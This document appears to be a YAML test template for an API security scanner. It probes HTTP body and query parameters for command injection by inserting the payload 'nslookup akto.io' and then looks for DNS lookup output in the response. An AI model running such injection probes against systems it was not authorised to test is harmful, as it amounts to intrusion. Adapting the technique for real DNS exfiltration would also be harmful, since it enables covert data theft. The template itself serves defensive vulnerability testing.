id: COMMAND_INJECTION_DNS_EXFILTRATION
info:
  name: "Command injection for DNS Exfiltration in HTTP request parameters"
  description: "Command injection for DNS exfiltration in HTTP request parameters involves an attacker inserting malicious commands into HTTP parameters to trigger DNS requests. These requests can exfiltrate sensitive data to attacker-controlled domains. By leveraging this technique, attackers can stealthily transmit information outside the target network, bypassing conventional security measures and firewalls."
  details: >
    "Command injection for DNS exfiltration in HTTP request parameters allows attackers to inject commands that initiate DNS queries, embedding sensitive data within them. These DNS requests are sent to attacker-controlled domains, effectively exfiltrating information. This technique exploits improper input validation in web applications, enabling attackers to covertly transfer data and bypass traditional security defenses."
  impact: "The impact of command injection for DNS exfiltration in HTTP request parameters includes the covert transfer of sensitive data to external attacker-controlled domains. This can lead to significant data breaches, compromising confidential information and potentially causing financial and reputational damage. Additionally, the stealthy nature of DNS exfiltration makes it challenging to detect, allowing prolonged exploitation of the vulnerability."
  category:
    name: COMMAND_INJECTION
    shortName: Command Injection
    displayName: Command Injection
  subCategory: COMMAND_INJECTION_DNS_EXFILTRATION
  severity: CRITICAL
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://twitter.com/trbughunters/status/1283133356922884096"
  cwe:
    - CWE-77
  cve:
    - CVE-2023-25826
    - CVE-2023-41031

attributes:
  nature: INTRUSIVE
  plan: FREE
  duration: FAST
compliance_standards:
  GDPR:
    - Article 32
  HIPAA:
    - 45 CFR ยง 164.312(c)(1)
    - 45 CFR ยง 164.306(a)
  SOC 2:
    - System and Communications Controls
    - Logical and Physical Access Controls
  PCI DSS:
    - Requirement 6.5.1
    - Requirement 6.6
  ISO 27001:
    - A.12.6.1
    - A.14.2.5
  NIST 800-53:
    - SI-10
    - SI-3
  CSA CCM:
    - APP-01
    - TVM-02
  CIS Controls:
    - IG1 Safeguard 16.2
    - IG2 Safeguard 18.3
  FedRAMP:
    - SI-10
    - SI-3
  NIST 800-171:
    - 3.14.1
    - 3.14.2
  FISMA:
    - SI-10
    - SI-3
  Cybersecurity Maturity Model Certification (CMMC):
    - SI.1.211
    - SI.2.216
api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  method:
    neq: "OPTIONS"
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
  or:
    - request_payload:
        for_one:
          key:
            regex: .*
            extract: changed_body_key
          value:
            extract: changed_body_value
    - query_param:
        for_one:
          key:
            regex: .*
            extract: changed_query_key
          value:
            regex: .*
            extract: changed_query_value
wordLists:
  specialOSPayloads:
    - "nslookup akto.io"
execute:
  type: single
  requests:
    - req:
        - modify_body_param:
            changed_body_key: ${specialOSPayloads}
        - modify_query_param:
            changed_query_key: ${specialOSPayloads}
validate:
  response_payload:
    length:
      gt: 0
    contains_all:
      - "Server:"
      - "Address:"
      - "Name:"
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
      - <html>
      - </html>
